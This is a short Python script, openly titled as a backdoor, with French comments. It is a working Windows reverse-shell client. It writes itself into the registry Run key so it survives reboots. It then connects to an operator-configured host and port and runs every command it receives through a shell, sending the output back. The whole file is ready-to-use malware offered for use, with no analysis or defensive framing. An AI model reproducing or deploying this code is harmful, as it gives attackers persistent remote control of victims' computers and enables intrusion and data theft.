# The easiest backdoor in the world.
# ___________  ___  ______ _   __ ___________  ______  ___  _____  _   _______ _____  ____________
# /  ___| ___ \/ _ \ | ___ \ | / /|  ___|  _  \ | ___ \/ _ \/  __ \| | / /  _  \  _  ||  _  | ___  |
# \ `--.| |_/ / /_\ \| |_/ / |/ / | |__ | | | | | |_/ / /_\ \ /  \/| |/ /| | | | | | || | | | |_/ /
# `--. \  __/|  _  ||    /|    \ |  __|| | | | | ___ \  _  | |    |    \| | | | | | || | | |    /
# /\__/ / |   | | | || |\ \| |\  \| |___| |/ /  | |_/ / | | | \__/\| |\  \ |/ /\ \_/ /\ \_/ / |\ \
# \____/\_|   \_| |_/\_| \_\_| \_/\____/|___/   \____/\_| |_/\____/\_| \_/___/  \___/  \___/\_| \_|     


import socket
import subprocess
import os
import sys
import winreg as reg



SERVER_HOST = '127.0.0.1'  # Definit ton IP
SERVER_PORT = 4444  # Definit ton PORT ( OUVERT ) | pas nécéssaire si c'est local

##########################################################


def main():
    add_to_startup()

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Objet socket pour la connexion réseau

    client.connect((SERVER_HOST, SERVER_PORT)) # Connexion au serveur | IP : PORT

    while True:
        command = client.recv(1024).decode() # Commande serveur de 1024 octets, décode la commande

        if 'exit' in command:
            break

        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        command_output = output.stdout.read() + output.stderr.read()

        client.send(command_output)

    client.close()




def add_to_startup():
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    app_name = "client.py" # Nom de votre application | Important de bien mettre le votre

    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_WRITE)
        executable_path = os.path.abspath(sys.argv[0])
        reg.SetValueEx(key, app_name, 0, reg.REG_SZ, executable_path)
        reg.CloseKey(key)
    except Exception as e:
        pass


if __name__ == "__main__":
    main()
